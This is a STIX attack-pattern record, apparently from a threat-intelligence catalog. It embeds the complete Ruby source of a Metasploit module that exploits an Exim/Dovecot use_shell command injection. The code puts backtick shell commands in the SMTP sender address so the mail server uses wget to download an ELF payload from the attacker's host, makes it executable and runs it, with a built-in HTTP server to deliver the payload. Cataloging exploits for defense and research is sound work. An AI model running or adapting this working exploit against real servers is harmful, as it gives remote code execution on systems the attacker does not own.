{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--335aa41c-834b-4c6f-a98e-0ca966fc11db",
    "created": "2024-08-14T16:57:03.422344Z",
    "modified": "2024-08-14T16:57:03.422349Z",
    "name": "Exim and Dovecot Insecure Configuration Command Injection",
    "description": " This module exploits a command injection vulnerability against Dovecot with Exim using the \"use_shell\" option. It uses the sender's address to inject arbitrary commands, since this is one of the user-controlled variables. It has been successfully tested on Debian Squeeze using the default Exim4 with the dovecot-common packages. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/smtp/exim4_dovecot_exec.rb",
            "external_id": "exim4_dovecot_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.redteam-pentesting.de/advisories/rt-sa-2013-001"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Smtp\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Exim and Dovecot Insecure Configuration Command Injection',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability against Dovecot with\n        Exim using the \"use_shell\" option. It uses the sender's address to inject arbitrary\n        commands, since this is one of the user-controlled variables. It has been\n        successfully tested on Debian Squeeze using the default Exim4 with the dovecot-common\n        packages.\n      },\n      'Author'         =>\n        [\n          'Unknown', # From redteam-pentesting # Vulnerability Discovery and PoC\n          'eKKiM', # PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '93004' ],\n          [ 'EDB', '25297' ],\n          [ 'URL', 'https://www.redteam-pentesting.de/advisories/rt-sa-2013-001' ]\n        ],\n      'Privileged'     => false,\n      'Arch'           => ARCH_X86,\n      'Platform'       => 'linux',\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'Linux x86', { }],\n        ],\n      'DisclosureDate' => '2013-05-03',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        OptString.new('EHLO', [ true, 'TO address of the e-mail', 'debian.localdomain']),\n        OptString.new('MAILTO', [ true, 'TO address of the e-mail', 'root@debian.localdomain']),\n        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),\n        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),\n        OptPort.new('SRVPORT', [ true, 'The daemon port to listen on', 80 ]),\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])\n      ])\n\n      register_advanced_options(\n      [\n        OptBool.new(\"SkipVersionCheck\", [false, \"Specify this to skip the version check\", false])\n      ])\n\n      deregister_options('MAILFROM')\n  end\n\n  # wait for the data to be sent\n  def wait_linux_payload\n    print_status(\"#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...\")\n\n    waited = 0\n    while (not @elf_sent)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['HTTP_DELAY'])\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?\")\n      end\n    end\n  end\n\n  # Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    if (not @pl)\n      print_error(\"#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!\")\n      return\n    end\n    print_status(\"#{rhost}:#{rport} - Sending the payload to the server...\")\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  def exploit\n\n    @pl = generate_payload_exe\n    @elf_sent = false\n\n    #\n    # start our web server to deploy the final payload\n    #\n    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))\n    resource_uri = '/' + downfile\n\n    if (datastore['DOWNHOST'])\n      service_url_payload = datastore['DOWNHOST'] + resource_uri\n    else\n\n      # Needs to be on the port 80\n      if datastore['SRVPORT'].to_i != 80\n        fail_with(Failure::Unknown, 'The Web Server needs to live on SRVPORT=80')\n      end\n\n      #do not use SSL\n      if datastore['SSL']\n        ssl_restore = true\n        datastore['SSL'] = false\n      end\n\n      #we use SRVHOST as download IP for the coming wget command.\n      #SRVHOST needs a real IP address of our download host\n      if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")\n        srv_host = datastore['URIHOST'] || Rex::Socket.source_address(rhost)\n      else\n        srv_host = datastore['SRVHOST']\n      end\n\n      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri\n      service_url_payload = srv_host + resource_uri\n      print_status(\"#{rhost}:#{rport} - Starting up our web service on #{service_url} ...\")\n      start_service({'Uri' => {\n        'Proc' => Proc.new { |cli, req|\n          on_request_uri(cli, req)\n        },\n        'Path' => resource_uri\n      }})\n\n      datastore['SSL'] = true if ssl_restore\n    end\n\n\n    connect\n\n    print_status(\"#{rhost}:#{rport} - Server: #{self.banner.to_s.strip}\")\n    if not datastore['SkipVersionCheck'] and self.banner.to_s !~ /Exim /\n      disconnect\n      fail_with(Failure::NoTarget, \"#{rhost}:#{rport} - The target server is not running Exim!\")\n    end\n\n    ehlo = datastore['EHLO']\n    ehlo_resp = raw_send_recv(\"EHLO #{ehlo}\\r\\n\")\n    ehlo_resp.each_line do |line|\n      print_status(\"#{rhost}:#{rport} - EHLO: #{line.strip}\")\n    end\n\n    #\n    # Initiate the message\n    #\n    filename = rand_text_alpha_lower(8)\n    from = rand_text_alpha(3)\n    from << \"`/usr/bin/wget${IFS}#{service_url_payload}${IFS}-O${IFS}/tmp/#{filename}`\"\n    from << \"`chmod${IFS}+x${IFS}/tmp/#{filename}`\"\n    from << \"`/tmp/#{filename}`\"\n    from << \"@#{ehlo}\"\n    to   = datastore['MAILTO']\n\n    resp = raw_send_recv(\"MAIL FROM: #{from}\\r\\n\")\n    resp ||= 'no response'\n    msg = \"MAIL: #{resp.strip}\"\n    if not resp or resp[0,3] != '250'\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - #{msg}\")\n    else\n      print_status(\"#{rhost}:#{rport} - #{msg}\")\n    end\n\n    resp = raw_send_recv(\"RCPT TO: #{to}\\r\\n\")\n    resp ||= 'no response'\n    msg = \"RCPT: #{resp.strip}\"\n    if not resp or resp[0,3] != '250'\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - #{msg}\")\n    else\n      print_status(\"#{rhost}:#{rport} - #{msg}\")\n    end\n\n    resp = raw_send_recv(\"DATA\\r\\n\")\n    resp ||= 'no response'\n    msg = \"DATA: #{resp.strip}\"\n    if not resp or resp[0,3] != '354'\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - #{msg}\")\n    else\n      print_status(\"#{rhost}:#{rport} - #{msg}\")\n    end\n\n    message = \"Subject: test\\r\\n\"\n    message <<  \"\\r\\n\"\n    message << \".\\r\\n\"\n\n    resp = raw_send_recv(message)\n    msg = \"DELIVER: #{resp.strip}\"\n    if not resp or resp[0,3] != '250'\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - #{msg}\")\n    else\n      print_status(\"#{rhost}:#{rport} - #{msg}\")\n    end\n    disconnect\n\n    # wait for payload download\n    if (datastore['DOWNHOST'])\n      print_status(\"#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the target to download the payload\")\n      select(nil, nil, nil, datastore['HTTP_DELAY'])\n    else\n      wait_linux_payload\n    end\n    register_file_for_cleanup(\"/tmp/#{filename}\")\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-03",
    "x_mitre_platforms": [
        "linux'"
    ]
}